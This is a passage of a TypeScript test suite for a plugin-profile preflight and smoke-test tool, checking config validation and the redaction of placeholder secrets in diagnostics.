      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string; message: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        {
          code: 'preflight-config-secret',
          message: 'entry config must not contain secret material',
          details: { config: '[REDACTED]' },
        },
      ])
      expect(result.stdout).not.toContain('sk-preflight-secret')
    } finally {
      cleanup(path)
    }
  })

  it('uses the plugin name when rejecting entry-level secret material without an id', () => {
    const secret = 'sk-entry-metadata-secret'
    const path = tempFile('entry-secret-without-id.yml', `- name: legal-plugin-name
  auditToken: ${secret}
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{
          code: 'preflight-entry-secret',
          target: 'legal-plugin-name',
          message: 'entry must not contain secret material',
        }],
      })
      expect(result.stdout).not.toContain(secret)
    } finally {
      cleanup(path)
    }
  })

  it('rejects secret material outside an entry config without echoing it', () => {
    const secret = 'sk-entry-name-secret'
    const path = tempFile('entry-secret.yml', `- id: entry-secret
  name: ${secret}
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{
          code: 'preflight-entry-secret',
          target: 'entry-secret',
          message: 'entry must not contain secret material',
        }],
      })
      expect(result.stdout).not.toContain(secret)
    } finally {
      cleanup(path)
    }
  })

  it('rejects a token in an unknown top-level Cordis entry field without echoing it', () => {
    const secret = 'sk-top-level-entry-secret'
    const path = tempFile('entry-top-level-secret.yml', `- id: legal-entry-id
  name: legal-plugin-name
  auditToken: ${secret}
  config:
    apiKeyEnv: DEEPSEEK_API_KEY
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{
          code: 'preflight-entry-secret',
          target: 'legal-entry-id',
          message: 'entry must not contain secret material',
        }],
      })
      expect(result.stdout).not.toContain(secret)
      expect(result.stderr).not.toContain(secret)
    } finally {
      cleanup(path)
    }
  })

  it('accepts legal Cordis entry names, ids, and environment references', () => {
    const path = tempFile('entry-legal-metadata.yml', `- id: token-reader
  name: credential-provider
  apiKeyEnv: DEEPSEEK_API_KEY
  config:
    tokenEnv: CURATED_ACCESS_TOKEN
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({ issues: [] })
    } finally {
      cleanup(path)
    }
  })

  it('rejects secret-like array and object config values', () => {
    const path = tempFile('patch.yml', `- id: array-secret
  config:
    token: [present]
- id: object-secret
  config:
    secret:
      nested: value
- id: number-token
  config:
    token: 0
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        {
          code: 'preflight-config-secret',
          target: 'array-secret',
          message: 'entry config must not contain secret material',
          details: { config: { token: '[REDACTED]' } },
        },
        {
          code: 'preflight-config-secret',
          target: 'object-secret',
          message: 'entry config must not contain secret material',
          details: { config: { secret: '[REDACTED]' } },
        },
      ])
    } finally {
      cleanup(path)
    }
  })

  it('rejects waterfall listener declarations that omit next delegation', () => {
    const path = tempFile('patch.yml', `- id: listener
  name: plugin-a
  config:
    curated:
      candidateId: plugin-a
      profile: web-curated
      active: true
      capability: web-search
      resources:
        waterfallListeners: [tools/pre-execute]
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: false,
        issues: [{ code: 'preflight-waterfall-next-missing', target: 'plugin-a' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects data boundary defaults that violate superpowers security rules', () => {
    const path = tempFile('patch.yml', `- id: unsafe-boundaries
  name: plugin-a
  config:
    telemetry:
      captureBody: true
    importMode: apply
    sessionsWrite: true
    externalBodyEgress: true
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string; message: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        { code: 'preflight-config-import-not-dry-run', target: 'unsafe-boundaries', message: 'config import must default to dry-run' },
        { code: 'preflight-external-body-egress', target: 'unsafe-boundaries', message: 'external systems must not egress full body content by default' },
        { code: 'preflight-otel-capture-body', target: 'unsafe-boundaries', message: 'OTel config must keep captureBody false by default' },
        { code: 'preflight-session-write', target: 'unsafe-boundaries', message: 'config import must not write sessions by default' },
      ])
    } finally {
      cleanup(path)
    }
  })

  it('rejects unsafe values for the real baseline candidate config fields', () => {
    const path = tempFile('patch.yml', `- id: memento
  config:
    writePolicy: auto
    writePolicies:
      source:import: auto
    proposals:
      enabled: true
      maxChars: 2000
      maxPending: 8
- id: permission-rules
  config:
    rulesFile: .dsh/rules.yaml
    badFilePolicy: ignore-with-warning
    maxRules: 256
    patternMode: glob
    watch: true
    enforce: false
- id: loongsuite-observability
  config:
    captureContent: true
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        { code: 'preflight-memory-auto-proposals', target: 'memento', message: 'memory config must disable automatic proposal capture' },
        { code: 'preflight-memory-write-overrides', target: 'memento', message: 'memory config must not override approval-gated writes' },
        { code: 'preflight-memory-write-policy', target: 'memento', message: 'memory writes must require approval' },
        { code: 'preflight-otel-capture-content', target: 'loongsuite-observability', message: 'OTel config must explicitly disable content capture' },
        { code: 'preflight-permission-bad-file-policy', target: 'permission-rules', message: 'permission rules must fail when their rule file is invalid' },
        { code: 'preflight-permission-enforcement-disabled', target: 'permission-rules', message: 'permission rules must explicitly enable enforcement' },
      ])
    } finally {
      cleanup(path)
    }
  })

  it('deduplicates repeated entry id diagnostics', () => {
    const path = tempFile('patch.yml', `- id: duplicate
- id: duplicate
- id: duplicate
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        {
          code: 'preflight-entry-id-duplicate',
          target: 'duplicate',
          message: 'curated patch contains duplicate entry ids',
        },
      ])
    } finally {
      cleanup(path)
    }
  })

  it('redacts secret-like target values in text and JSON diagnostics', () => {
    const path = tempFile('patch.yml', `- id: sk-target-secret
- id: sk-target-secret
`)
    try {
      const json = runPreflight(['--fixture', path, '--json'])
      const text = runPreflight(['--fixture', path])
      const payload = JSON.parse(json.stdout) as { issues: Array<{ code: string; target?: string; message: string }> }

      expect(json.status).toBe(1)
      expect(payload.issues).toEqual([
        {
          code: 'preflight-entry-id-duplicate',
          target: '[REDACTED]',
          message: 'curated patch contains duplicate entry ids',
        },
        {
          code: 'preflight-entry-secret',
          target: '[REDACTED]',
          message: 'entry must not contain secret material',
          details: {
            entry: {
              id: '[REDACTED]',
            },
          },
        },
      ])
      expect(json.stdout).not.toContain('sk-target-secret')
      expect(text.stdout).toContain('preflight-entry-id-duplicate [REDACTED]')
      expect(text.stdout).not.toContain('sk-target-secret')
    } finally {
      cleanup(path)
    }
  })

  it('falls back from missing curated ids to plugin names', () => {
    const path = tempFile('patch.yml', `- name: plugin-a
  config:
    curated:
      profile: web-curated
      active: true
      capability: web-search
      resources:
        toolNames: [web_search]
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: true,
        entryCount: 1,
        issues: [],
      })
    } finally {
      cleanup(path)
    }
  })

  it('falls back from missing curated ids to entry ids', () => {
    const path = tempFile('patch.yml', `- id: id-fallback
  config:
    curated:
      profile: web-curated
      active: true
      capability: web-search
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: true,
        entryCount: 1,
        issues: [],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects active curated entries without candidate fallback or capability metadata', () => {
    const path = tempFile('patch.yml', `- config:
    curated:
      profile: web-curated
      active: true
      capability: web-search
- id: incomplete
  config:
    curated:
      profile: web-curated
      active: true
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: false,
        entryCount: 2,
        issues: [
          {
            code: 'preflight-curated-candidate-id-missing',
            message: 'active curated entry must declare candidateId or have a string entry id/name fallback',
          },
          {
            code: 'preflight-curated-capability-missing',
            target: 'incomplete',
            message: 'active curated entry must declare a capability',
          },
        ],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects invalid active curated metadata before profile conflict checks', () => {
    const path = tempFile('patch.yml', `- id: invalid-candidate
  config:
    curated:
      candidateId: 3
      active: true
      capability: web-search
      resources: []
- id: invalid-profile
  config:
    curated:
      candidateId: explicit-candidate
      profile: 7
      active: true
      capability: web-search
- config:
    curated:
      candidateId: 4
      profile: 5
      active: true
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { entryCount: number; issues: Array<{ code: string; target?: string; message: string }> }

      expect(result.status).toBe(1)
      expect(payload.entryCount).toBe(3)
      expect(payload.issues).toHaveLength(7)
      expect(payload.issues).toEqual(expect.arrayContaining([
        {
          code: 'preflight-curated-candidate-id-invalid',
          target: 'invalid-candidate',
          message: 'active curated candidateId must be a non-empty string',
        },
        {
          code: 'preflight-curated-candidate-id-invalid',
          message: 'active curated candidateId must be a non-empty string',
        },
        {
          code: 'preflight-curated-candidate-id-missing',
          message: 'active curated entry must declare candidateId or have a string entry id/name fallback',
        },
        {
          code: 'preflight-curated-capability-missing',
          message: 'active curated entry must declare a capability',
        },
        {
          code: 'preflight-curated-profile-invalid',
          target: 'explicit-candidate',
          message: 'active curated profile must be a non-empty string',
        },
        {
          code: 'preflight-curated-profile-invalid',
          message: 'active curated profile must be a non-empty string',
        },
        {
          code: 'preflight-curated-resources-invalid',
          target: 'invalid-candidate',
          message: 'active curated resources must be a map',
        },
      ]))
    } finally {
      cleanup(path)
    }
  })

  it('rejects malformed active curated resource claims', () => {
    const path = tempFile('patch.yml', `- name: plugin-a
  config:
    curated:
      profile: web-curated
      active: true
      capability: web-search
      resources:
        toolNames: [""]
        commandNames: command
        ports: [3000]
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: false,
        entryCount: 1,
        issues: [
          {
            code: 'preflight-curated-resource-list-invalid',
            target: 'plugin-a',
            message: 'active curated resources.commandNames must be a list of non-empty strings',
          },
          {
            code: 'preflight-curated-resource-value-invalid',
            target: 'plugin-a',
            message: 'active curated resources.ports[0] must be a non-empty string',
          },
          {
            code: 'preflight-curated-resource-value-invalid',
            target: 'plugin-a',
            message: 'active curated resources.toolNames[0] must be a non-empty string',
          },
        ],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects unsupported arguments after redacting secret-like values', () => {
    const result = runPreflight(['--api-key=sk-unsupported-secret'])

    expect(result.status).toBe(1)
    expect(result.stdout).toContain('preflight-input-invalid')
    expect(result.stdout).toContain('[REDACTED]')
    expect(result.stdout).not.toContain('sk-unsupported-secret')
  })

  it.each(['--password', '--api-key', '--token'])('redacts ordinary values supplied through %s', (flag) => {
    const secret = 'ordinary-value-7391'
    const result = runPreflight([`${flag}=${secret}`])

    expect(result.status).toBe(1)
    expect(result.stdout).toContain(`${flag}=[REDACTED]`)
    expect(result.stdout).not.toContain(secret)
  })

  it('scans secret-named values nested under curated metadata', () => {
    const path = tempFile('patch.yml', `- id: curated-secret
  name: plugin-a
  config:
    curated:
      candidateId: plugin-a
      profile: web-curated
      active: false
      capability: web-search
      token: ordinary-curated-secret
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-config-secret',
        target: 'curated-secret',
      }))
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-curated-key-unknown',
      }))
      expect(result.stdout).not.toContain('ordinary-curated-secret')
    } finally {
      cleanup(path)
    }
  })

  it.each([true, false])('rejects unknown curated metadata keys when active is %s', (active) => {
    const path = tempFile('patch.yml', `- id: curated-unknown
  name: dsh-web-search-pro
  config:
    curated:
      candidateId: dsh-web-search-pro
      profile: web-curated
      active: ${String(active)}
      capability: web-search
      unexpected: value
      resources:
        unknownResource: [value]
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; message: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual(expect.arrayContaining([
        {
          code: 'preflight-curated-key-unknown',
          message: 'curated metadata contains unknown key unexpected',
        },
        {
          code: 'preflight-curated-resource-key-unknown',
          message: 'curated resources contain unknown key unknownResource',
        },
      ]))
    } finally {
      cleanup(path)
    }
  })
})

describe('smoke-profile command', () => {
  it('rejects rootless smoke instead of staging a synthesized profile', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'])

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      observed: false,
      issues: [{ code: 'smoke-profile-profile-root-required' }],
    })
  })

  it('rejects required provider evidence missing for the requested profile', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-provider-evidence-'))
    const targetProfiles = ['fixture-curated', 'other-curated']
    const consumer = artifactCandidate({
      targetProfiles,
      externalDependencies: ['runtime-bundle'],
      requiredRuntimeBundles: ['runtime-bundle'],
      runtimeActivationEvidence: fixtureRuntimeActivationEvidenceFor(
        targetProfiles,
        ['runtime-bundle'],
      ),
    })
    const provider = artifactCandidate({
      id: 'runtime-provider',
      capability: 'browser',
      expectedPackage: 'runtime-bundle',
      repository: 'https://github.com/example/runtime-provider',
      commit: fixtureCommitC,
      targetProfiles,
      runtimeActivationEvidence: {
        'other-curated': fixtureRuntimeActivationEvidenceSet(),
      },
      resources: { entryIds: ['runtime-provider'] },
    })
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-fixture-curated',
        private: true,
        dependencies: {},
        dsh: { profile: { bundles: ['plugin-a', 'runtime-bundle'] } },
      }))
      stageCandidatePackage(profileRoot, 'plugin-a', undefined, {}, undefined, consumer)
      stageCandidatePackage(profileRoot, 'runtime-bundle', undefined, {}, undefined, provider)
      const commands = await commandsWithCatalogCandidates([consumer, provider])

      const result = await commands.runSmokeProfile(['--profile', 'fixture-curated', '--json'], {
        profiles: { 'fixture-curated': { bundles: ['plugin-a', 'runtime-bundle'] } },
        profileRoot,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })

      expect(result.status, result.stdout).toBe(1)
      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'preflight-required-runtime-bundle-evidence-missing',
        target: 'plugin-a',
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('loads and disposes an observable fixture service through the installed resolver', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-observable-home-'))
    const profileRoot = join(home, 'profiles', 'web-curated')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-web-curated',
      private: true,
      dsh: { profile: { bundles: ['dsh-web-search-pro'] } },
    }))
    writeFileSync(join(profileRoot, 'cordis.patch.yml'), '[]\n')
    const catalog = loadCuratedCatalog()
    const candidate = admittedCandidate('dsh-web-search-pro')
    stageCandidatePackage(
      profileRoot,
      'dsh-web-search-pro',
      `- insert:
    - id: web-search-pro
      name: dsh-web-search-pro
`,
      {},
      [
        'export const name = "observable-fixture"',
        'export const inject = []',
        'export function apply(ctx) {',
        '  ctx.effect(() => ctx.provide("curatedFixtureService", Object.freeze({ live: true })), "fixture service")',
        '}',
        '',
      ].join('\n'),
      candidate,
    )
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({ ...catalog, candidates: [candidate] }),
      }
    })
    const commands = await import('../src/index.ts')
    const events: string[] = []
    try {
      const result = await commands.runSmokeProfile([
        '--profile',
        'web-curated',
        '--profile-root',
        profileRoot,
        '--artifact-root',
        profileRoot,
        '--json',
      ], {
        profiles: { 'web-curated': { bundles: ['dsh-web-search-pro'] } },
        runner: async (request: SmokeProfileRunnerRequest) => {
          if (request.stage === 'dump-config') {
            const profile = loadProfile(
              'curated-fixture',
              'web-curated',
              join(profileRoot, 'package.json'),
              home,
            )
            const configPath = join(profileRoot, 'composed.cordis.json')
            writeFileSync(configPath, JSON.stringify(composeEntries([
              ...profile.layers.map(layer => layer.patches),
              profile.patches,
            ])))
            const ctx = await boot(
              'curated-fixture',
              configPath,
              undefined,
              undefined,
              pathToFileURL(join(profileRoot, 'package.json')).href,
            )
            events.push(ctx.get('curatedFixtureService') === undefined ? 'missing' : 'registered')
            await ctx.fiber.dispose()
            events.push(ctx.get('curatedFixtureService') === undefined ? 'disposed' : 'retained')
          }
          return { status: 0, stdout: '', stderr: '', durationMs: 1 }
        },
      })

      expect(result.status).toBe(0)
      expect(events).toEqual(['registered', 'disposed'])
      expect(existsSync(join(profileRoot, 'noop-plugin.mjs'))).toBe(false)
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('declares shipped wrappers as package bins', () => {
    const manifest = JSON.parse(readFileSync(join(packageRoot, 'package.json'), 'utf8')) as {
      readonly bin?: Record<string, string>
    }

    expect(manifest.bin).toEqual({
      'dsh-curated-verify-lock': 'lib/verify-lock.js',
      'dsh-curated-preflight': 'lib/preflight.js',
      'dsh-curated-smoke-profile': 'lib/smoke-profile.js',
      'dsh-curated-compare-benchmark': 'lib/compare-benchmark.js',
    })
  })

  it('keeps every curated workspace package publicly publishable', () => {
    for (const packageName of [
      'curated-base',
      'curated-bench',
      'curated-policy',
      'curated-profiles',
      'curated-scripts',
    ]) {
      const manifest = JSON.parse(
        readFileSync(resolve(packageRoot, '..', packageName, 'package.json'), 'utf8'),
      ) as { private?: boolean; publishConfig?: { access?: string } }
      expect(manifest.private, packageName).not.toBe(true)
      expect(manifest.publishConfig?.access, packageName).toBe('public')
    }
  })

  it('validates installed artifacts without importing candidate main files or creating a no-op bundle shim', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-installed-home-'))
    const profileRoot = join(home, 'profiles', 'web-curated')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-web-curated',
      private: true,
      dsh: { profile: { bundles: ['dsh-web-search-pro'] } },
    }))
    writeFileSync(join(profileRoot, 'cordis.patch.yml'), '[]\n')
    const catalog = loadCuratedCatalog()
    const candidate = admittedCandidate('dsh-web-search-pro')
    stageCandidatePackage(
      profileRoot,
      'dsh-web-search-pro',
      undefined,
      {},
      [
        'globalThis.__dshCuratedArtifactLoads = (globalThis.__dshCuratedArtifactLoads ?? 0) + 1',
        'throw new Error("sk-artifact-import-secret")',
        '',
      ].join('\n'),
      candidate,
    )
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({ ...catalog, candidates: [candidate] }),
      }
    })
    const commands = await import('../src/index.ts')
    const globalState = globalThis as typeof globalThis & { __dshCuratedArtifactLoads?: number }
    try {
      delete globalState.__dshCuratedArtifactLoads
      const result = await commands.runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: {
          'web-curated': {
            bundles: ['dsh-web-search-pro'],
          },
        },
        profileRoot,
        artifactRoots: [profileRoot],
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })

      expect(result.status).toBe(0)
      expect(globalState.__dshCuratedArtifactLoads).toBeUndefined()
      expect(existsSync(join(profileRoot, 'noop-plugin.mjs'))).toBe(false)
      expect(result.stdout).not.toContain('sk-artifact-import-secret')
    } finally {
      delete globalState.__dshCuratedArtifactLoads
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('rejects reordered installed bundle lists', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-order-'))
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-web-curated',
      dsh: { profile: { bundles: ['fixture-b', 'fixture-a'] } },
    }))
    let runnerCalls = 0
    try {
      writeFileSync(join(profileRoot, '.npmrc'), 'ignore-scripts=true\n')
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['fixture-a', 'fixture-b'] } },
        profileRoot,
        runner: async () => {
          runnerCalls += 1
          return { status: 0, stdout: '', stderr: '', durationMs: 1 }
        },
      })

      expect(result.status).toBe(1)
      expect(runnerCalls).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        ok: false,
        observed: true,
        profile: 'web-curated',
        issues: [{
          code: 'smoke-profile-input-invalid',
          message: 'installed profile web-curated bundle list does not match the selected template',
        }],
      })

      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-web-curated',
        dsh: { profile: { bundles: ['fixture-a', 1] } },
      }))
      const invalid = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['fixture-a'] } },
        profileRoot,
        runner: async () => {
          runnerCalls += 1
          return { status: 0, stdout: '', stderr: '', durationMs: 1 }
        },
      })
      expect(invalid.status).toBe(1)
      expect(runnerCalls).toBe(0)
      expect(JSON.parse(invalid.stdout)).toMatchObject({
        issues: [{
          code: 'smoke-profile-input-invalid',
          message: 'installed profile web-curated bundle list does not match the selected template',
        }],
      })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('preserves observed profile and stage diagnostics when staging fails', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-staging-'))
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-web-curated',
      dsh: { profile: { bundles: ['dsh-web-search-pro'] } },
    }))
    writeFileSync(join(profileRoot, '.npmrc'), 'ignore-scripts=true\n')
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['dsh-web-search-pro'] } },
        profileRoot,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })

      expect(result.status).toBe(1)
      const payload = JSON.parse(result.stdout) as { stages: Array<{ error?: string }> }
      expect(payload).toMatchObject({
        command: 'smoke-profile',
        ok: false,
        observed: true,
        profile: 'web-curated',
        stages: [{
          name: 'staging',
          ok: false,
        }],
        issues: [{ code: 'smoke-profile-input-invalid' }],
      })
      const stageError = payload.stages[0]?.error
      if (typeof stageError !== 'string') throw new TypeError('expected stage error')
      expect(stageError).toContain('must be active for profile web-curated')
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('redacts JSON-style secrets from staging diagnostics', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-staging-secret-'))
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profileRoot,
        prepare: async () => { throw new Error('staging failed: {"token":"literal-secret-value"}') },
      })
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{ message: string }>
        stages: Array<{ error?: string }>
      }

      expect(result.status).toBe(1)
      expect(payload.issues[0]?.message).toBe('staging failed: {"token":"[REDACTED]"}')
      expect(payload.stages[0]?.error).toBe('staging failed: {"token":"[REDACTED]"}')
      expect(result.stdout).not.toContain('literal-secret-value')
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('redacts escaped JSON string secrets from staging diagnostics', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-staging-escaped-secret-'))
    const secret = 'secret-suffix'
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profileRoot,
        prepare: async () => { throw new Error(JSON.stringify({ token: `ordinary\\"${secret}` })) },
      })
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{ message: string }>
        stages: Array<{ error?: string }>
      }

      expect(result.status).toBe(1)
      expect(payload.issues[0]?.message).not.toContain(secret)
      const stageError = payload.stages[0]?.error
      if (typeof stageError !== 'string') throw new TypeError('expected stage error')
      expect(stageError).not.toContain(secret)
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('redacts nested JSON secret values from prefixed staging diagnostics', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-staging-nested-secret-'))
    const secret = 'plainsecret123'
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profileRoot,
        prepare: async () => {
          throw new Error(`staging failed: ${JSON.stringify({ token: { value: secret }, message: 'escaped "quote"' })}`)
        },
      })
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{ message: string }>
        stages: Array<{ error?: string }>
      }

      expect(result.status).toBe(1)
      expect(payload.issues[0]?.message).not.toContain(secret)
      const stageError = payload.stages[0]?.error
      expect(stageError).toBeTypeOf('string')
      expect(stageError).not.toContain(secret)
      expect(payload.issues[0]?.message).toContain('[REDACTED]')
      expect(stageError).toContain('[REDACTED]')
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('redacts text secrets after malformed embedded JSON diagnostics', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-staging-malformed-json-'))
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profileRoot,
        prepare: async () => { throw new Error('staging failed: {] token=sk-unbalanced-secret') },
      })
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{ message: string }>
        stages: Array<{ error?: string }>
      }

      expect(result.status).toBe(1)
      expect(payload.issues[0]?.message).not.toContain('sk-unbalanced-secret')
      const stageError = payload.stages[0]?.error
      expect(stageError).toBeTypeOf('string')
      expect(stageError).not.toContain('sk-unbalanced-secret')
      expect(payload.issues[0]?.message).toContain('[REDACTED]')
      expect(stageError).toContain('[REDACTED]')
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('redacts text secrets after unterminated embedded JSON diagnostics', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-staging-unterminated-json-'))
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profileRoot,
        prepare: async () => {
          throw new Error('staging failed: {"ordinary":"unterminated" token=sk-unterminated-secret')
        },
      })

      expect(result.status).toBe(1)
      expect(result.stdout).not.toContain('sk-unterminated-secret')
      expect(result.stdout).toContain('[REDACTED]')
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it.each([
    ['auth', 'plain auth confidential value', '"', false],
    ['auth_header', 'plain prefixed auth value', '"', false],
    ['header_auth', 'plain suffixed auth value', '"', false],
    ['a\\u0075th', 'plain escaped auth value', '"', false],
    ['auth', 'plain unterminated auth value', '', false],
    ['auth\\q', 'plain malformed auth key value', '"', false],
    ['auth', 'plain-unquoted-auth-value', '', true],
  ])('redacts an unterminated JSON %s field from staging diagnostics', async (key, secret, suffix, unquoted) => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-staging-auth-json-'))
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profileRoot,
        prepare: async () => {
          const value = unquoted ? secret : `"${secret}${suffix}`
          const spacing = key === 'auth_header' ? '  ' : ''
          throw new Error(`staging failed: {"${key}":${spacing}${value}`)
        },
      })

      expect(result.status).toBe(1)
      expect(result.stdout).not.toContain(secret)
      expect(result.stdout).toContain('[REDACTED]')
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('redacts escaped secret keys and complete multiword values when the whole JSON is invalid', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-staging-invalid-json-'))
    const secrets = [
      'unicode auth multiword value \\q suffix',
      'quoted key multiword value',
      'auth multiword value',
      'multiword value',
      'suffix auth multiword value',
      'api key multiword value',
    ]
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profileRoot,
        prepare: async () => {
          throw new Error(
            'staging failed: {"a\\u0075th":"unicode auth multiword value \\q suffix",'
            + '"service\\"ApiKey":"quoted key multiword value",'
            + '"auth_header":unquoted auth multiword value,'
            + '"header_auth":"suffix auth multiword value",'
            + '"apiKey":"api key multiword value"}',
          )
        },
      })

      expect(result.status).toBe(1)
      expect(result.stdout).toContain('[REDACTED]')
      for (const secret of secrets) expect(result.stdout).not.toContain(secret)
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it.each([
    ['Bearer', 'Bearer first bearer secret words', 'bearer secret words'],
    ['Basic', 'Basic first basic secret words', 'basic secret words'],
    ['custom scheme', 'CustomScheme first custom secret words', 'custom secret words'],
    ['plain value', 'first plain secret words', 'plain secret words'],
  ])('redacts a complete non-JSON Authorization %s line', async (_name, secret, leakedTail) => {
